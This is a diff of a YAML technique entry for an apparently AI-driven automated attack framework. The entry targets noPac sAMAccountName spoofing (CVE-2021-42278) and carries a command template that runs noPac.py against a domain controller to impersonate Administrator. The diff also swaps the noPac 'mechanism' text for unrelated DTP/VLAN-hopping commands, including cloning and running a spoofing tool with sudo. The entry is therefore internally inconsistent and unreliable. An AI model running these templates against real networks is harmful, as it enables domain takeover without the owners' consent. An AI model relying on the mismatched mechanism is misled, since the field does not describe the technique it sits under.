@@ -2,16 +2,20 @@ name: samaccountname_spoof
 category: ad
 description: sAMAccountName spoofing (noPac/CVE-2021-42278)
 preconditions:
-  - domain_joined
-  - has_cred
+- domain_joined
+- has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "python3 noPac.py '{domain}/{username}:{password}' -dc-ip {target_ip} --impersonate Administrator -use-ldap"
+command_template: python3 noPac.py '{domain}/{username}:{password}' -dc-ip {target_ip}
+  --impersonate Administrator -use-ldap
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Creates machine account, renames to DC name (minus $), requests TGT, renames back, requests S4U2self as DA. Requires MachineAccountQuota > 0."
+mechanism: 'git clone https://github.com/fleetcaptain/dtp-spoof.git sudo python3 dtp-spoof/dtp-spoof.py
+  -i eth0 --desirable Recon helper (passively fingerprint the port’s DTP state): sudo
+  modprobe 8021q sudo ip link add link eth0 name eth0.30 type vlan id 30'
+hacktricks_ref: generic-methodologies-and-resources/pentesting-network/lateral-vlan-segmentation-bypass.md
